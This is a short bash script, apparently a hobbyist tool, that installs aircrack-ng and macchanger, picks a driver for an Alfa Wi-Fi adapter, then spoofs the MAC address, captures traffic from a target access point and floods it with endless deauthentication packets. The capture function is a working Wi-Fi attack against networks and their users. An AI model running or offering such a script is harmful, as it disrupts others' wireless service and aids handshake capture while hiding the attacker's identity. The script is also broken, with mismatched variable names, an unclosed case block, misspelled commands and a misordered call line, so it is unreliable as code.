#! /bin/bash
source .env 

cat /etc/os-release > check_Os
source check_Os

install () {
    if [[ "$ID_LIKE" == "debian" ]]
    then
        apt update && apt upgrade -y
        apt install macchanger net-tools aircrack-ng
    elif [[ "$ID_LIKE" == "arch" ]]
    then
        pacman -Syu
        pacman -S macchanger net-tools aircrack-ng
    else
        echo "what kind of f*uck*ng OS do you have ?"
    fi
}

choose () {
choice_='Choose your Alfa: '
foods=("Usb-B" "USB-C")
select fav in "${alfa[@]}"; do
    case $fav in
        "Usb-B")
            echo "So you have the $fav Alfa"
            apt install 
            ;;
        "USB-C")
            echo "So you have the $fav Alfa"
            apt install realtek-rtl88xxau-dkms -y
            ;;
}

capture () {
    ifconfig wlan0 down
    maccahanger wlan0 -r
    iwconfig wlan0 mode monitor
    airmong-ng 
    airodump-ng -w capture_of`date +%Y-%m-%d-%H-%M` -c 2 --bssid xx:xx:xx:xx:xx:xx wlan0mon
    aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan0mon
}

choose capture install
